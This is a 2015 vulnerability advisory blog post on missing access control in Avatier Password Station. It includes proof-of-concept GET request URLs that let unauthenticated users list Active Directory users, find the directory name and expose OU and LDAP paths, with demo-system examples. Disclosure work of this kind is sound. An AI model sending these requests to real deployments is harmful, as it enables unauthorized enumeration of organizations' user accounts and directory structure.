---
title: "Missing Function Level Access Control - Avatier Password Station"
categories: "netsec"
tags: ["vulnerabilities","mflac"]
date: "2015-04-26T10:00:00-05:00"

---
<div id="pagemenu">
<ol>
<li><a href="{{< perm >}}#Summary">Summary MFLAC</a></li>
<li><a href="{{< perm >}}#Class">Classification / Timeline</a> </li>
<li><a href="{{< perm >}}#Tech">Details</a></li>
<li><a href="{{< perm >}}#Class1">Classification / Timeline</a> </li>
<li><a href="{{< perm >}}#Tech1">Details</a></li>

</ol>
</div>

<div id="pagesummary">
<h2 id="Summary"> <a>Summary</a> </h2>
<p>
The Password station interface does not disable user search functionality, instead it hides the icon allowing unauthenticated users to grab a list of all users able to reset their passwords and any other information stored along with this in AD, it is also possible to veiw the ldap search path.<!--more-->
</p>
<p>
The developer was notified on the 29/11/14, after initial contact Avatier were "Unable to replicate the issues", due to lack of access to a later version of the software to test the user disclosure and LDAP disclosure may have been fixed in version 9.
</p>
</div>
<div id="maincontent">
<h2 id="Class"> <a> Classification / Timeline</a> </h2>
<div style="float:left;width:44%">
<p>Classification:</p> 

<table class="cvet">
    <tbody><tr>
      <td class="title">Type</td>
      <td>Missing Functional Level Access Control</td>
    </tr>
      <tr>
        <td class="title">OWASP Top 10</td>
        <td><a target="_blank" href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control">MFLAC</a></td>
      </tr>
      <tr>
        <td class="title">CWE</td>
        <td><a target="_blank" href="https://cwe.mitre.org/data/definitions/935.html">935</a></td>
      </tr>
      <tr>
        <td class="title">CVSS Score</td>
        <td><a target="_blank" href="https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:L/Au:N/C:P/I:N/A:N)">5.0 Base </a></td>
      </tr>
      <tr>
        <td class="title">CV/E-Number</td>
        <td>Non Assigned :( </td>
      </tr>
  </tbody></table>
</div>

<div style="float:right;width:44%">
  
<p>Timeline: </p>
  <table class="timet">
      <tbody><tr>
      <td class="title">Vendor Notified</td>
      <td>
         24-11-2014
      </td>
      </tr><tr>
      <td class="title">Vendor Patch</td>
      <td>
          Unknown
      </td>    </tr><tr>  
        <td class="title" title="The date the vulnerability was published publicly">Publicly Published</td>
        <td title="The date the vulnerability was published publicly">
          26-04-2015
        </td>
      </tr>
    <tr>
      <td class="title">Last Updated</td>
      <td>
          26-04-2015
      </td>
    </tr>
  </tbody></table>
</div>
<div class="clearfix"> </div>

<h2 id="Tech"> <a> Details </a> </h2>
<p>
Unauthenticated remote users are able to force a request to search for all users behind the password station application by crafting a get request to the following URL (replacing XXXAD with the remote AD) with a example URL using the live demo system Below:
{{< highlight bash >}}
Loading.aspx?Ctl=editUserID&attr=samAccountName&attrdisp=SAM%20Account%20Name&sysid=XXXAD&mode=query&objtype=undefined&adgrpmode=0&searchText=

http://livedemo.passwordstation.net/Loading.aspx?Ctl=editUserID&attr=samAccountName&attrdisp=SAM%20Account%20Name&sysid=LIVEDEMO&mode=query&objtype=undefined&adgrpmode=0&searchText=
{{< /highlight >}}    

An incorrect AD name leads to an error "Searches are not currently supported for this directory service type or system is down.", a correct AD name points to a user list. 

If you are unsure of the AD name in use you can retrieve it from the following URL with an example using the live demo below (however many applications seem to be found under aims/ps) 

{{< highlight bash >}}
ps/PB70ChangePassword.aspx

http://livedemo.passwordstation.net/ps/PB70ChangePassword.aspx
{{< /highlight >}}
</p>




<h2 id="Class1"> <a> Classification / Timeline</a> </h2>
<div style="float:left;width:44%">
<p>Classification:</p> 

<table class="cvet">
    <tbody><tr>
      <td class="title">Type</td>
      <td>Information Disclosure</td>
    </tr>
      <tr>
        <td class="title">OWASP Top 10</td>
        <td><a target="_blank" href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control">MFLAC</a></td>
      </tr>
      <tr>
        <td class="title">CWE</td>
        <td><a target="_blank" href="https://cwe.mitre.org/data/definitions/200.html">200</a></td>
      </tr>
      <tr>
        <td class="title">CVSS Score</td>
        <td><a target="_blank" href="https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:L/Au:N/C:P/I:N/A:N)">5.0 Base (Seems a bit high)</a></td>
      </tr>
      <tr>
        <td class="title">CV/E-Number</td>
        <td>Non Assigned :( </td>
      </tr>
  </tbody></table>
</div>

<div style="float:right;width:44%">
  
<p>Timeline: </p>
  <table class="timet">
      <tbody><tr>
      <td class="title">Vendor Notified</td>
      <td>
         24-11-2014
      </td>
      </tr><tr>
      <td class="title">Vendor Patch</td>
      <td>
          Unknown
      </td>    </tr><tr>  
        <td class="title" title="The date the vulnerability was published publicly">Publicly Published</td>
        <td title="The date the vulnerability was published publicly">
          26-04-2015
        </td>
      </tr>
    <tr>
      <td class="title">Last Updated</td>
      <td>
          26-04-2015
      </td>
    </tr>
  </tbody>
    </table>
</div>
<div class="clearfix"> </div>

<h2 id="Tech1"> <a> Details </a> </h2>
<p>
Unauthenticated remote users are able to force a request to search for the OU groups and Ldap Paths behind the password station application by crafting a get request to the following URL (replacing XXXAD with the remote AD) with a example URL using the live demo system Below:
{{< highlight bash >}}
oupicker.aspx?OuCtlDisplay=2&OuCtlDN=2&domain=XXXAD

http://livedemo.passwordstation.net/oupicker.aspx?OuCtlDisplay=2&OuCtlDN=2&domain=LIVEDEMO
{{< /highlight >}}    

Due to the presence of these two exposed functions it suggests that there may be more functions where directly called could output sensitive information. If any readers use the Password station program and would allow me to have a poke to see what else I can find it would be much appreciated! 
</p>

</div>
